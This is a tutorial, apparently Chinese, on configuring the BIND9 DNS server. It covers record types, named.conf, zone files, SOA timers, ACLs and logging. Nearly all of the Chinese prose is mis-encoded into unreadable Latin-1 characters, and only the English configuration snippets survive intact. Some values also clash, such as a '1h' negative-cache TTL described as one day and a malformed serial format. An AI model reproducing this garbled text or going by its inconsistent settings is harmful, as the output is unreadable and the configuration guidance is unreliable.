ç²¾ç»†çš„æ§åˆ¶ã€‚ åŸŸåç©ºé—´æ˜¯ä¸€ä¸ªåˆ†å±‚æ•°ï¼Œå…¶ä¸­DNSçš„æ ¹åŸŸä½äºé¡¶éƒ¨ï¼ŒDNSåŒºåŸŸå§‹äºè¯¥æ ‘ä¸­çš„ä¸€ä¸ªåŸŸï¼Œå¹¶ä¸”å¯ä»¥æ‰©å±•åˆ°ä¸‹è¾¹çš„å­åŸŸã€‚ èµ„æºè®°å½•ç±»å‹ èµ„æºè®°å½•ç±»å‹ å­—ç¬¦ä¸² å«ä¹‰ A Addressåœ°å€ï¼Œ IPv4 AAAA Addressåœ°å€ IPv6 NS Name ServeråŸŸåæœåŠ¡å™¨ SOA Start of Authority èµ·å§‹æˆæƒæœºæ„ MX Mail Exchanger é‚®ä»¶äº¤æ¢ CNAME Canonical Nameè§„èŒƒå. CNAME-records ( Canonical name for an alias )æ˜¯åŸŸåçš„åˆ«åã€‚ PTR Pointer æŒ‡é’ˆï¼Œå³åå‘DNSç³»ç»Ÿï¼Œç”¨äºæŸ¥è¯¢IPåœ°å€æ—¶ç»™å‡ºç›¸å…³çš„åŸŸåï¼Œå³æŸ¥è¯¢IPåœ°å€çš„PTRè®°å½•ç»™å‡ºè¯¥IPæŒ‡å‘çš„åŸŸåï¼Œåœ¨ Zone æ–‡ä»¶ä¸­è¢«è®¾ç½®ï¼› TXT Textï¼Œç½‘ç»œåç§°ç³»ç»Ÿçš„è®°å½•ï¼Œå¯è®²æ–‡å­—ä¿¡æ¯æä¾›ç»™ç½‘ç»œæ„å¤–çš„æ¥æºï¼Œå…¶ä¸­æœ‰ä¸€ä¸ªéå¸¸é‡è¦çš„åŠŸèƒ½å°±æ˜¯å½“å¤–éƒ¨æŸ¥è¯¢éœ€è¦æ˜¾ç¤ºBINDçš„ç›¸å…³ç‰ˆæœ¬å·æ—¶ï¼Œå¯ä»¥æŒ‡å®š TXTæŸ¥è¯¢ï¼Œè¿™ä¸ªé…ç½®æ˜¯é»˜è®¤çš„ï¼›è°·æ­Œä¼šä½¿ç”¨ TXT è®°å½•æ¥éªŒè¯ç½‘ç«™çš„æ‹¥æœ‰æƒä»¥åŠç¡®ä¿ç”µå­é‚®ä»¶çš„å®‰å…¨ï¼› SRV Service è®°å½•ï¼ŒåŸŸåä¸­ç”¨äºæŒ‡å®šæœåŠ¡å™¨å¹¶æä¾›æœåŠ¡çš„ä½ç½®ï¼šä¸»æœºã€ç«¯å£å·ï¼›ä¸€èˆ¬åœ¨ Zone File ä¸­è¢«å®šä¹‰ï¼› FQDN FQDN(Fully Qualified Domain Name) å®Œå…¨åˆæ ¼åŸŸå/å…¨ç¨‹åŸŸåï¼Œå³åŸŸåå¯ä»¥é€šè¿‡DNSè¿›è¡Œè§£æï¼Œå…¶å…¬å¼ FQDN = HostName + Domainã€‚ è§£å†³å¤šæœåŠ¡é—®é¢˜, æ¯”å¦‚åŸŸåä¸º yanquer.con , ftp ç”¨ ftp.yanquer.com , ssh ç”¨ ssh.yanquer.com ä»‹ç» bind9 æ˜¯ç›®å‰å¸‚é¢æ˜¯æœ€ä¸»æµçš„å¼€æºDNSè½¯ä»¶ å®‰è£…: apt install bind9 é…ç½®æ–‡ä»¶ä½ç½®: /etc/bind/named.conf æŸ¥çœ‹å…¶å†…å®¹: root@6c378cbe42dd:/# cat /etc/bind bind/ bindresvport.blacklist root@6c378cbe42dd:/# cat /etc/bind/named.conf // This is the primary configuration file for the BIND DNS server named. // // Please read /usr/share/doc/bind9/README.Debian.gz for information on the // structure of BIND configuration files in Debian, *BEFORE* you customize // this configuration file. // // If you are just adding zones, please do that in /etc/bind/named.conf.local include \"/etc/bind/named.conf.options\"; include \"/etc/bind/named.conf.local\"; include \"/etc/bind/named.conf.default-zones\"; å¯ä»¥çœ‹åˆ°å…¶å¼•ç”¨äº†ä¸‰ä¸ªæ–‡ä»¶: /etc/bind/named.conf.options : named.conf.options /etc/bind/named.conf.local : named.conf.local /etc/bind/named.conf.default-zones : named.conf.default-zones é…ç½®æ–‡ä»¶è¯´æ˜ ä»¥ä¸‹æ–‡ä»¶éƒ½åœ¨ /etc/bind/ ç›®å½•ä¸‹ æ³¨æ„ä¸è¦æ›´æ”¹æ–‡ä»¶æƒé™ named.conf.options option é…ç½® named.conf.local Zone çš„å¼•å¯¼é…ç½®æ–‡ä»¶ å®šä¹‰äº† BIND9 ä¸­çš„ ZONEï¼ˆåŒºåŸŸï¼‰æ–‡ä»¶åœ¨named.conf.localæ–‡ä»¶ä¸­çš„å®šä¹‰ï¼Œç”¨äºå®šä¹‰å­˜å‚¨è§£æçš„åŸŸåçš„æ•°æ®åº“æ–‡ä»¶ï¼Œå³åŸŸåä¸IPåœ°å€çš„æ˜ å°„å…³ç³»ä»¥åŠDNSå‘é€çš„è§£æåŸŸåæ•°æ®åŒ…çš„ç›¸å…³å‚æ•°è®¾ç½®ï¼Œå…¶å®šä¹‰çš„æ ¼å¼å¦‚ä¸‹: zone \"<YOUR DNS Domain Name >\" { <Configurations> } ä¹Ÿå¯ä»¥å®šä¹‰åå‘è§£æåŸŸåé€šè¿‡ä»¥ä¸‹çš„æ ¼å¼è¿›è¡Œå®šä¹‰: zone \"<YOUR IP ADDRESS>-addr.arpa\" { <Configurations> } Configurations å¸¸ç”¨å‚æ•°é…ç½®å¦‚ä¸‹: file: ç”¨äºæŒ‡å‡ºåŸŸåä¸IPåœ°å€è§£æçš„æ•°æ®åº“é…ç½®æ–‡ä»¶ï¼› allow-transfer: è¿™ä¸ªåœ°æ–¹çš„é…ç½®æ˜¯ç”¨æ¥ç»™å‡º Failover æˆ–è€…æ˜¯ é€’å½’æŸ¥è¯¢DNSæœåŠ¡å™¨çš„IPåœ°å€ï¼Œå¦‚æœä¹‹å‰åœ¨ options é‡Œé…ç½®çš„allow-transfer å¦‚æœè®¾ç½®æˆäº†å‚æ•° yesï¼Œ é‚£ä¹ˆéœ€è¦åœ¨è¿™é‡ŒæŒ‡å‡ºé€’å½’æŸ¥è¯¢æœåŠ¡å™¨çš„IPåœ°å€ï¼› type: ç”¨äºæŒ‡å®šå½“å‰DNSè§£ææœåŠ¡å™¨çš„ä½ç½®ï¼Œæ˜¯ä¸»æœåŠ¡å™¨ master è¿˜æ˜¯ä»æœåŠ¡å™¨ slaver named.conf.default-zones æœºå™¨é»˜è®¤åŸŸåé…ç½®: # vim /etc/default/bind9 OPTIONS=\"-u bind -4\" Zone File ä¿å­˜ RR (Record Resource) ä¿¡æ¯çš„æ–‡ä»¶ DNS Record Types åˆ†ä¸ºå¾ˆå¤šç§ åœ°å€è§£æ ( Address Records) åˆ«åè®°å½•ï¼ˆAlias Recordsï¼‰ é‚®ä»¶äº¤æ¢è®°å½•ï¼ˆEmail Exchange Recordsï¼‰ åŸŸåæœåŠ¡å™¨è®°å½•ï¼ˆName Server Recordsï¼‰ï¼› ç¡®å®šä½ çš„éœ€æ±‚ï¼Œå†ç¼–å†™ä½ çš„Zone Fileï¼› é…ç½®å«ä¹‰è¯´æ˜ åœ¨ zone file ä¸­ï¼Œæ³¨é‡Šçš„ç¬¦å·æ˜¯ï¼š ; (åˆ†å·) @ ( at - sign ) æ˜¯ä»£è¡¨å½“å‰çš„åŒºåŸŸï¼Œå³ æ¯ä¸€ä¸ª åŸŸåå°±æ˜¯ä¸€ä¸ªåŒºåŸŸ(region)ï¼Œ ä¸€èˆ¬åœ¨ $ORIGIN [REGION NAME] è®¾å®šäº†å½“å‰ä½œç”¨çš„åŒºåŸŸï¼Œä½œç”¨åŒºåŸŸæ˜¯ä»£è¡¨å½“å‰çš„è§£æåŸŸååŒºåŸŸï¼› ä¾‹: ; ; BIND data file for local loopback interface ; ; Import ZSK / KSK ; ; $ORIGIN domain.com. ; æˆ‘ä»¬å·²ç»å®šä¹‰äº†ä¸€ä¸ªåŒºåŸŸï¼Œé‚£ä¹ˆåœ¨å®šä¹‰ SOA çš„æ—¶å€™å¯ä»¥è¿›è¡Œä¸¤ç§å®šä¹‰æ–¹å¼ @ IN SOA ns.domain.com. admin.domain.com. ( 3 ; Serial 604800 ; Refresh 86400 ; Retry 2419200 ; Expire 604800 ) ; Negative Cache TTL ; æˆ–è€…æˆ‘ä»¬ä¸éœ€è¦ at-sign - @ ç¬¦å·ï¼Œç›´æ¥å¼•ç”¨ORIGINçš„åå­— ï¼›åœ¨è¿™é‡Œè¿™ä¸¤æ¡é…ç½®ä»£è¡¨çš„å«ä¹‰æ˜¯ä¸€æ ·çš„ domain.com. ns.domain.com. admin.domain.com. ( 3 ; Serial 604800 ; Refresh 86400 ; Retry 2419200 ; Expire 604800 ) ; Negative Cache TTL ä¸Šè¾¹çš„é…ç½®ä¸­ @ ä»£è¡¨äº†å½“å‰çš„åŒºåŸŸ domain.com. domain.com. å°±æ˜¯å½“å‰çš„åŒºåŸŸ Zone File - TTL TTL è§„å®šäº†Resource Record çš„å¤±æ•ˆæ—¶é—´ï¼Œå³å½“å‰èµ„æºè®°å½•èƒ½å¤Ÿè¢«ç¼“å­˜çš„æ—¶é—´é•¿çŸ­ï¼Œé»˜è®¤çš„å•ä½ä¸ºç§’ï¼Œèƒ½å¤Ÿè®¾å®šçš„æœ€å¤§æ—¶é—´é•¿åº¦æ˜¯ 32 bit çš„æ•´å½¢å˜é‡ ( 0 åˆ° 4294967295 )ï¼Œå•ä½æ˜¯ç§’ï¼›RRéƒ½ä¼šè¢«ä¿å­˜åœ¨DNSçš„è§£ææœåŠ¡å™¨çš„cacheä¸Šï¼Œæœ‰ä¸€ä¸ªå¤±æ•ˆçš„æ—¶é—´ï¼ŒTTLå°±æ˜¯æ§åˆ¶è¿™ä¸ªå¤±æ•ˆæ—¶é—´çš„ä¸€ä¸ªå‚æ•°ï¼› è¿™ä¸ªå‚æ•°å¯ä»¥å•ç‹¬è¿›è¡Œè®¾å®šï¼Œä¹Ÿå¯ä»¥åœ¨ SOA è®¾å®šä¸­è¿›è¡Œé…ç½®ï¼š å•ç‹¬è®¾å®šï¼š $TTL [TIME] åœ¨ SOA ä¸­è¿›è¡Œè®¾å®šï¼š SOA - Negative Cache TTL ä¾‹: $TTL 6048000 Zone File - SOA SOA - Start of Authorityï¼Œ èµ·å§‹æˆæƒéƒ¨åˆ†ï¼Œæ˜¯æ¯ä¸€ä¸ª Zone File å¿…é¡»åŒ…å«çš„éƒ¨åˆ†ï¼Œä¹Ÿæ˜¯åŒ…å«åŸŸåçš„å…³é”®ä¿¡æ¯ã€‚ å¦‚æœæœ‰å¤šå°DNSæ¥ç®¡ç†åŒä¸€ä¸ªåŸŸåï¼Œå°±éœ€è¦åœ¨ zone file ä¸­è§„å®šå¦‚ä½•è§„å®šä¸¤ä¸ªåŸŸåè§£ææœåŠ¡å™¨äº† - Name Serverï¼› å³éœ€è¦åœ¨å®šä¹‰ Zone Fie çš„æ—¶å€™ï¼Œéœ€è¦ç‰¹åˆ«æ˜ç¡® SOA çš„å®šä¹‰ï¼ŒSOA å®šä¹‰äº†åŸŸåè§£ææœåŠ¡å™¨çš„å¯¹äºåŒºåŸŸ (Location) çš„æ•°æ®ä¿¡æ¯æ¥æºï¼Œå³è§„å®šäº†è§£æåŒºåŸŸçš„IPç›¸å…³åœ°å€ï¼› æ¯ä¸€ä¸ªåŸŸååŒºåŸŸéƒ½éœ€è¦ä¸€ä¸ª SOA è®°å½•ï¼› å®šä¹‰çš„æ–¹å¼æ˜¯: [LOCATION NAME] IN SOA [PRIMARY_DNS_SERVER_NAME] [EMAIL_ADDRESS_NAME] ( 1 ; Serial 3h ; Refresh after 3 hours 1h ; Retry after 1 hour 1w ; Expire After 1 Week 1h ; Negative caching TTL of 1 day ) é…ç½®ä¸¾ä¾‹: domain.com. ns.domain.com. admin.domain.com. ( 3 ; Serial 604800 ; Refresh 86400 ; Retry 2419200 ; Expire 604800 ) ; Negative Cache TTL è§£é‡Šä¸€ä¸‹ä¸Šè¾¹çš„ç›¸å…³å‚æ•°ï¼š Location Name ä»å‰è¾¹ $ORIGIN æˆ‘ä»¬å·²ç»çŸ¥é“æ˜¯ä¸€ä¸ªåŒºåŸŸçš„åç§°ï¼Œæˆ–è€…ç”¨ @ è¿›è¡Œä»£æ›¿ï¼› PRIMARY_DNS_SERVER_NAME ç”¨äºè§„å®šè§£æå½“å‰åŸŸåçš„ä¸»æœåŠ¡å™¨ï¼Œè¿™ä¸ªæœåŠ¡å™¨çš„IPåœ°å€ä»¥åŠè¯¦ç»†èµ„æºéœ€è¦åœ¨åè¾¹è¢«è§„å®šï¼› EMAIL_ADDRESS_NAME æŒ‡å®šäº†ç®¡ç†å‘˜çš„ Email åœ°å€ï¼Œä»¥ä¸Šè¾¹ä¸ºä¾‹ï¼š admin.domain.com. == admin@domain.com. Serial åºå·ï¼Œä»£è¡¨ç€å½“å‰æ•°æ®åº“æ–‡ä»¶çš„æ–°æ—§ï¼Œ è¯¥å€¼è¶Šå¤§è¡¨ç¤ºå½“å‰æ•°æ®åº“çš„é…ç½®è¶Šæ–°ï¼Œä¸€èˆ¬æ¥è¯´è¿™ä¸ªå€¼è®¾å®šçš„å€¼éµå¾ª YYYYMMMMDDDD çš„æ ¼å¼ï¼› è¿™ä¸ªæ•°å€¼å¿…é¡»å°äº 4294967296ï¼›åœ¨è¿™é‡Œæ¶‰åŠåˆ°ä¸€ä¸ª ä»æœåŠ¡å™¨ ( Slave )çš„ é…ç½®é—®é¢˜ï¼Œå¦‚æœä½ éœ€è¦ ä»æœåŠ¡å™¨ ä½•æ—¶ä»ä¸»æœåŠ¡å™¨æ‹‰å–æœ€æ–°çš„é…ç½®ï¼Œå°±éœ€è¦ä¿æŒä»æœåŠ¡å™¨è¿™ä¸ªæ•°å€¼ä½äºä¸»æœåŠ¡å™¨çš„æ•°å€¼ï¼› Refresh æ›´æ–°çš„é¢‘ç‡ï¼Œè®¾ç½® Slave DNS æœåŠ¡å™¨ å»å‘ ä¸»æœåŠ¡å™¨ è¿›è¡Œé…ç½®æ›´æ–°çš„å‘¨æœŸï¼› Retry å¤±è´¥é‡æ–°å°å°è¯•æ—¶é—´ï¼Œå¦‚æœ Slave æœåŠ¡å™¨æ— æ³•å¯¹ Master è¿›è¡Œé“¾æ¥ï¼Œåˆ™éœ€è¦è®¾ç½®è¿™ä¸ªå€¼è§„å®šå¤šé•¿æ—¶é—´è¿›è¡Œä¸€æ¬¡é‡è¯•è¿æ¥ï¼› Expire æ˜¯å¤±æ•ˆæ—¶é—´ï¼Œå¦‚æœä¸€ç›´å¤±è´¥è¿æ¥ï¼Œé‚£ä¹ˆè¿™ä¸ªé…ç½®è§„å®šäº†é‡è¯•è¿æ¥çš„æœ€å¤§æ—¶é—´ï¼› Negative Cache TTL ç¼“å­˜æ—¶é—´ï¼Œåœ¨æ•´ä¸ª zone file éƒ½æ²¡æœ‰è§„å®š TTL æ—¶é—´çš„æƒ…å†µä¸‹ï¼Œé‚£ä¹ˆå°±ä»¥ SOA ä¸­è§„å®šçš„ TTL ä¸ºä¸»ï¼› å¯¹äºå„ä¸ªå‚æ•°çš„é™åˆ¶: Refresh >= Retry Ã— 2 Refresh + Retry < Expire Expire >= Retry Ã— 10 Expire >= 7 Days æ³¨è§£ åœ¨æ‰€æœ‰çš„é…ç½®ä¸­ï¼Œ ns.domain.com != ns.domain.com. ï¼Œå¿…é¡»æ³¨æ„åœ¨ zone file ä¸­çš„é…ç½®æ–‡ä»¶çš„æœ€å . å¿…é¡»ä¸èƒ½çœç•¥ï¼› å¦‚æœä¸å†™æœ€åä¸€ä¸ªçš„ . é‚£ä¹ˆè¯¥åŸŸåå°±æ˜¯ä¸€ä¸ª ç›¸å¯¹å ï¼Œç»“æœå°±æ˜¯åœ¨è§£æçš„è¿‡ç¨‹ä¸­ï¼Œè¿™æ¡èµ„æºå°±è¢«å½“æˆ ns.domain.com.domain.com zone file - Name Server Records Name Server Records å®šä¹‰äº†åœ¨å½“å‰ DNSæœåŠ¡å™¨ ä¸­çš„ NS çš„ IPåœ°å€ï¼Œåœ¨æ¯ä¸€ä¸ª zone file ä¸­å¿…é¡»æŒ‡å®š ä¸»/ä» åŸŸåè§£æå™¨çš„IPåœ°å€ï¼Œ ä½¿ç”¨ A è®°å½•ï¼Œè¿™ä¸ªIPåœ°å€å¿…é¡»ä¸ä½ æ­å»ºçš„DNSæœåŠ¡å™¨ä¿æŒä¸€è‡´ï¼› ä¸¾ä¾‹: ; è®°å½• NS è®°å½• @ IN NS ns.domain.com. ; è®°å½• NS è®°å½•å¯¹åº”çš„ IP åœ°å€ä¿¡æ¯ ns.domain.com. IN A 192.168.1.1 zone file - Address Records Address Records è®°å½•äº† åŸŸå ä¸ IP åœ°å€çš„å¯¹åº”å…³ç³»: ns.domain.com. IN A 192.168.1.1 zone file - Canonical Name Records CName å°† å•ä¸ªæ˜µç§°æˆ–è€…åˆ«åæ˜ å°„åˆ°ä¸€ä¸ªå¯èƒ½å­˜åœ¨åœ¨åŒºåŸŸå¤–çš„çœŸå®çš„åŒºåŸŸ. åœ¨ä¸€ä¸ªåŸŸåä¸‹å­˜åœ¨å¤šä¸ªå­åŸŸåï¼Œå¦‚æœéœ€è¦æ›´æ”¹æ˜ å°„ä¹‹å‰çš„å­åŸŸåï¼Œé‚£ä¹ˆåªéœ€è¦æ›´æ”¹æ˜ å°„çš„åŸŸååœ°å€å°±å¯ä»¥äº†: ; $TTL 2d $ORIGIN domain.com. ... server1 IN A 192.168.1.1 www IN CNAME Server1 é…ç½®é¡¹è¯´æ˜ acl ä¸€èˆ¬æ¥è¯´ï¼ŒACLæ¨¡å—ç”¨æ¥æ‰¿æ‹…æ§åˆ¶ä¸»æœºå¯ä»¥è®¿é—®åŸŸåè§£ææœåŠ¡å™¨çš„è§’è‰²ï¼Œå…¶è®¾ç½®ä¸ä¼šè®©æ§åˆ¶æ–‡ä»¶çš„é…ç½®éå¸¸å†—ä½™å’Œåºå¤§ã€‚ é‡‡ç”¨è¿™ä¸ªé…ç½®å¯ä»¥æœ‰æ•ˆé˜²èŒƒDOSä»¥åŠSpoofingæ”»å‡»ã€‚ ä¸€èˆ¬æ¥è¯´å®šä¹‰è¿™éƒ¨åˆ†çš„å†…å®¹æ¥è§„å®šIPæ˜¯å¦èƒ½å¤Ÿè¢«æ¥å…¥ä»¥åŠBlacklistæ¥é˜»æ­¢æŸäº›ç‰¹å®šçš„IPåœ°å€ä»‹å…¥åˆ°åŸŸåè§£ææœåŠ¡å™¨ä¸­ã€‚ ACLåŒ¹é…å®¢æˆ·ç«¯æ˜¯å¦èƒ½å¤Ÿæ¥å…¥åˆ°åŸŸåæœåŠ¡å™¨åŸºäºä¸‰ä¸ªåŸºæœ¬çš„ç‰¹å¾: å®¢æˆ·ç«¯çš„IPv4æˆ–è€…IPv6åœ°å€ ç”¨äºç­¾ç½²è¯·æ±‚çš„ TSIG å’Œ SIG(0) å¯†é’¥ åœ¨DNSå®¢æˆ·ç«¯å­ç½‘é€‰é¡¹ä¸­ç¼–ç çš„å‰ç¼€åœ°å€ åŒ¹é… acl å®šä¹‰ä»¥åŠä½¿ç”¨è§„åˆ™å¦‚ä¸‹ï¼š string æ˜¯ç”¨æ¥å‘½åIPåœ°å€é›†çš„ä¸€ä¸ªå˜é‡åï¼Œå¯ä»¥éšæ„åœ°è¢«å‘½å: acl <string> { <address_match_element>; ... }; ä¸¾ä¸€ä¸ªåœ¨ named.conf.options æ–‡ä»¶ä¸­è¢«å®šä¹‰çš„ä¾‹å­: acl bogusnets { 0.0.0.0/8; 192.0.2.0/24; 224.0.0.0/3; 10.0.0.0/8; 172.16.0.0/12; 192.168.0.0/16; }; // è¿™ä¸ªéƒ¨åˆ† // Set up an ACL called our-nets. Replace this with the // real IP numbers. acl our-nets { 172.16.2.11/24; 172.16.2.12/24; }; //å­ç½‘çš„åç§° logging logging éƒ¨åˆ†çš„é…ç½®ä¸ºDNSè§£ææœåŠ¡å™¨æä¾›äº†æ—¥å¿—è®°å½•çš„åŠŸèƒ½ï¼ŒDNSæœåŠ¡å™¨ä¸Šçš„æ‰€æœ‰æ—¥å¿—è®°å½•è¢«å­˜å‚¨åˆ°äº†æŒ‡å®šçš„æ–‡ä»¶ä¸­ã€‚ å…¶é€šç”¨çš„é…ç½®æ–‡ä»¶ä¸º: logging { category <string> { <channel_name_string>; ... }; channel <string> { buffered <boolean>; file <quoted_string> [ versions ( unlimited | <integer> ) ] [ size <size> ] [ suffix ( increment | timestamp ) ]; null; print-category <boolean>; print-severity <boolean>; print-time ( iso8601 | iso8601-utc | local | <boolean> ); severity <log_severity>; stderr; syslog [ <syslog_facility> ]; }; }; ä»ä¸Šè¾¹çš„é€šç”¨é…ç½®æ ¼å¼å¯ä»¥çœ‹å‡ºæ¥ï¼Œlogging æ¨¡å—åˆ†ä¸ºä¸¤ä¸ªéƒ¨åˆ†ï¼Œcategory å’Œ channel. channelçš„ä½œç”¨æ˜¯æŒ‡å®šè¾“å‡ºçš„æ–¹å¼ã€æ—¥å¿—æ ¼å¼çš„é€‰é¡¹å’Œäº‹ä»¶çš„ä¸¥é‡æ€§ï¼Œæ¯ä¸€ä¸ªchannel å¯ä»¥æŒ‡å®šä¸€ä¸ª category æ¥æŒ‡å®šè®°å½•çš„äº‹ä»¶ç±»å‹ã€‚ category ç”¨æ¥åŒºåˆ†ä¸åŒçš„äº‹ä»¶äº§ç”Ÿçš„ç±»åˆ«æˆ–è€…åœºæ™¯ï¼Œæ¯”å¦‚ï¼šå®¢æˆ·ç«¯è¯·æ±‚-client requestã€é…ç½®æ–‡ä»¶è§£æå¤„ç†-Configuration file parsing and processingã€‚ å¦‚æœåœ¨ named.conf.options æ–‡ä»¶ä¸­æ²¡æœ‰æŒ‡å®š logging æ¨¡å—ç³»ç»Ÿä¼šç»™å‡ºä¸€ä¸ªé»˜è®¤çš„é…ç½®: logging { category default { default_syslog; default_debug; }; category unmatched { null; }; }; channel çš„é…ç½®è§„åˆ™ æ‰€æœ‰çš„æ—¥å¿—è¾“å‡ºéƒ½éœ€è¦ channel æ¥æŒ‡å®šè¾“å‡ºæ ¼å¼ï¼ŒBIND9 å¯¹äºåˆ›å»º channel çš„æ•°é‡æ²¡æœ‰é™åˆ¶ã€‚ æ¯ä¸€ä¸ª channel éƒ½éœ€è¦ä¸ºè¯¥é€šé“çš„æ—¥å¿—ä¿¡æ¯æŒ‡å®šä¸€ä¸ª destination clause - ç›®çš„å¥æŸ„ï¼Œç›®çš„å¥æŸ„åœ¨ channel é˜¶æ®µè¢«é…ç½®ï¼Œè¿™ä¸ªç›®çš„å¥æŸ„ç”¨æ¥åŒºåˆ†ï¼š è¾“å‡ºåˆ°å…·ä½“çš„æ–‡ä»¶çš„åå­— - file è¾“å‡ºåˆ°å…·ä½“çš„ç³»ç»Ÿæ—¥å¿—å·¥å…·ä¸­ï¼ˆsyslog/syslogdï¼‰- syslog è¾“å‡ºåˆ°ç»ˆç«¯æ˜¾ç¤º- æ ‡å‡†é”™è¯¯æµ(standard error stream) æˆ–è€…è¯¥é”™è¯¯æ¶ˆæ¯ç›´æ¥è¢«ä¸¢å¼ƒ - nullã€‚ å…¶æ¬¡ï¼Œchannel çš„é…ç½®å¯ä»¥è§„å®šæ¯ä¸€ä¸ªé”™è¯¯æ—¥å¿—æ¶ˆæ¯çš„å“åº”çº§åˆ«ï¼Œé»˜è®¤çš„å“åº”çº§åˆ«æ˜¯info ï¼Œchannel å¯ä»¥è§„å®šæ¥å—é”™è¯¯æ¶ˆæ¯çš„çº§åˆ«ï¼› æ­¤å¤–ï¼Œchannel è¿˜å¯ä»¥æ§åˆ¶è¾“å‡ºé”™è¯¯æ—¥å¿—æ¶ˆæ¯çš„æ ¼å¼ï¼Œå¯ä»¥åŒ…å«ï¼šå“åº”æ—¶é—´æˆ³ã€categoryåå­—ã€ä¸¥é‡ç­‰çº§ç­‰ã€‚ channel çš„é…ç½®å‚æ•° buffered: ç”¨æ¥è§„å®šæ˜¯å¦åˆ·æ–°é”™è¯¯æ—¥å¿—çš„æ–‡ä»¶ï¼Œå…¶å‚æ•°å€¼ä¸º<boolean>ï¼Œåœ¨ BIND9 ä¸­ <boolean> å€¼çš„å‚æ•°å€¼ä¸º yes / noï¼Œå¦‚æœè®¾ç½®æˆä¸º yes é‚£ä¹ˆæ—¥å¿—æ¶ˆæ¯æµ(ä¸€èˆ¬æ¯ä¸€ä¸ªé”™è¯¯æ—¥å¿—æ¶ˆæ¯éƒ½æ˜¯ä¸€ä¸ª Log Entry)å°±ä¸ä¼šåˆ·æ–°ï¼Œè€Œæ˜¯è¢«ä¿å­˜åœ¨ç¼“å†²åŒºä¸­äº†ï¼Œä¸ä¼šåˆ·æ–°åˆ°æ–‡ä»¶ä¸­ã€‚ fileï¼š ç±»ä¼¼äºLinuxçš„é€šé“æ¦‚å¿µï¼Œfile å°†æ—¥å¿—è¾“å‡ºæµé€šè¿‡é€šé“ç›´æ¥è¾“å‡ºç»™æ–‡ä»¶ï¼Œä»ä¸Šè¾¹çš„é€šç”¨é…ç½®å¯ä»¥çœ‹å‡ºæ¥å¯ä»¥ä¸º file æŒ‡å®šæ–‡æœ¬æ–‡ä»¶çš„å¤§å° - size ï¼›æŒ‡å®š log æ–‡ä»¶çš„ç‰ˆæœ¬å· - versionï¼›æŒ‡å®šç”¨äºå‘½åå¤‡ä»½ç‰ˆæœ¬çš„æ ¼å¼ - suffix size ç”¨æ¥é™åˆ¶logæ–‡ä»¶çš„å¤§å°ï¼Œå¦‚æœlogæ–‡ä»¶çš„å¤§å°è®¾ç½®è¶…è¿‡äº†è®¾å®šçš„é˜ˆå€¼ï¼Œé‚£ä¹ˆç³»ç»Ÿä¼šè‡ªåŠ¨åœæ­¢è¾“å‡ºå†…å®¹åˆ°æ–‡ä»¶ä¸­ï¼› versionsï¼š ç”¨äºæŒ‡å®šæ–°åˆ›å»ºçš„ logæ–‡ä»¶æ•°å­˜å‚¨åˆ°æœ¬åœ°çš„ä¸Šé™å€¼ï¼Œé»˜è®¤çš„å‚æ•°å€¼ä¸ºunlimitedï¼Œå½“æŒ‡å®šçš„æ–‡ä»¶çš„å¤§å°è¶…è¿‡è®¾å®šçš„sizeå€¼å¾—æ—¶å€™ï¼Œå¦‚æœæ²¡æœ‰æŒ‡å®š versionsï¼Œé‚£ä¹ˆç³»ç»Ÿå°±ä¸ä¼šç»§ç»­å†™è¿›logï¼›å¦‚æœåˆ¶å®šäº†versionsï¼Œé‚£ä¹ˆå°±ä¼šç»§ç»­å†™å…¥ï¼› suffix ï¼šè®¾å®šç”¨æ¥å‘½ålogæ–‡ä»¶çš„æ–¹å¼ï¼›å¥½åƒæ²¡å•¥ç”¨ï¼Œæˆ‘æ·»åŠ è¿™ä¸ªå‚æ•°æ²¡æœ‰ä»€ä¹ˆååº”...ï¼› syslogï¼šå°†é€šé“å®šå‘åˆ°ç³»ç»Ÿçš„æ—¥å¿—æ–‡ä»¶æµä¸­ï¼› å¸¸ç”¨çš„æ”¯æŒæ—¥å¿—æ–‡ä»¶æœåŠ¡ä¸ºï¼šdameonã€syslogã€local6ã€local7ï¼› severityï¼šç”¨æ¥æ‰¿æ‹…å®šä¹‰æ—¥å¿—ä¸¥é‡çº§åˆ«çš„å®šä¹‰è§’è‰²ï¼Œç›¸å½“äº syslog - prioritiesã€‚æ¯”å¦‚è¯´å®šä¹‰äº†æ—¥å¿—çš„ä¸¥é‡çº§åˆ«ä¸º Debugï¼Œé‚£ä¹ˆä¼šè¾“å‡ºæ—¥å¿—äº‹ä»¶ Debug ä»¥ä¸Šçš„é”™è¯¯åˆ°æ–‡ä»¶ä¸­ã€‚ä¸€èˆ¬å¸¸ç”¨çš„ä¸¥é‡ç­‰çº§ï¼š debug[level]ã€noticeã€warningã€dynamic - ä¸å½“å‰æœåŠ¡å™¨çš„æ—¥å¿—ä¿æŒä¸€è‡´ï¼›ä¸€èˆ¬çš„ DNSæœåŠ¡å™¨çš„æ—¥å¿—ç­‰çº§è°ƒæˆ infoå³å¯ï¼› stderrï¼šå°†é€šé“æŒ‡å‘æœåŠ¡å™¨çš„æ ‡å‡†é”™è¯¯æµã€‚è¿™æ˜¯ä¸ºäº†åœ¨æœåŠ¡å™¨ä½œä¸ºå‰å°è¿›ç¨‹è¿è¡Œæ—¶ä½¿ç”¨ï¼› print-timeï¼š yes / no / local / iso8601 / iso8061-utc å¯ä»¥è®¾å®šä¸åŒçš„è¾“å‡ºåˆ°æ—¥å¿—æ–‡ä»¶çš„æ—¶é—´æ ¼å¼ï¼› print-categoryï¼šæ‰“å°æ—¥å¿—æ¶ˆæ¯é…ç½®category çš„ä¿¡æ¯åˆ°ä½ è®¾å®šçš„æ—¥å¿—æ–‡ä»¶ä¸­ï¼› print-severityï¼š æ‰“å°æ—¥å¿—çš„ä¸¥é‡ç­‰çº§ categoryè¯ç»„é…ç½®è§„åˆ™ categoryè¯ç»„é…ç½®è§„åˆ™: category <config_string> { <channel_name_string>; ... }; clientï¼š å®¢æˆ·ç«¯è¯·æ±‚ï¼› cnameï¼šç”±äºæ˜¯CNAMEè€Œä¸æ˜¯a /AAAAè®°å½• çš„åŸŸåæœåŠ¡å™¨ï¼› configï¼š é…ç½®æ–‡ä»¶è§£æå’Œå¤„ç†è¿‡ç¨‹ï¼› databaseï¼šä¸åç§°æœåŠ¡å™¨å†…éƒ¨ç”¨äºå­˜å‚¨åŒºåŸŸå’Œç¼“å­˜æ•°æ®çš„æ•°æ®åº“ç›¸å…³çš„æ¶ˆæ¯ï¼› generalï¼š æ²¡æœ‰è¢«å½’ç±»çš„ category ç±»åˆ«çš„å…¶ä»–ç§ç±»çš„æ—¥å¿—æ–‡ä»¶ä¿¡æ¯ï¼› 